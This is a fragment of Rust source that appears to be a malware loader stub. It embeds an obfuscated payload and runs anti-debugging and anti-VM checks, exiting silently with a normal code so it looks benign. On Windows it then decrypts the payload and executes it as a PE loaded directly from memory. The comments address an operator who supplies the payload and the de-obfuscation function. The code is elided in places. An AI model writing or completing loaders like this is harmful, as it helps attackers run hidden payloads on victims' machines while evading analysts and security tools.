...
// 1. Embed the obfuscated binary directly into the .rdata section
// Replace "payload.obin" with the actual path to your obfuscated file
const OBFUSCATED_PAYLOAD: &[u8] = include_bytes!("payload.obin");

fn main() {
    let checker = SignatureChecker::new();
    
    // 2. Perform silent Anti-Analysis checks
    // If a debugger or VM is found, we exit successfully (code 0) to look normal.
    ...
    for rule in rules {
        if let Ok(matched) = rule.matches(&checker) {
            if matched {
                // Exit successfully on rule match
                std::process::exit(0);
            }
        }
    }

    // 3. Execution Path (Windows Only)
    #[cfg(windows)]
    {
        // De-obfuscate the bytes using your transform_data function
        let decrypted_bytes = transform_data(OBFUSCATED_PAYLOAD);

        unsafe {
            // Pass the bytes directly to your PE loader
            match load_pe_from_memory(&decrypted_bytes) {
                Ok(_) => {
                    // Inner layer is now running!
                },
                Err(_) => {
                    // Exit silently on loader error
                    std::process::exit(0);
                }
            }
        }
    ...
    // If not Windows, or if the loader returns, just end.
    std::process::exit(0);
}
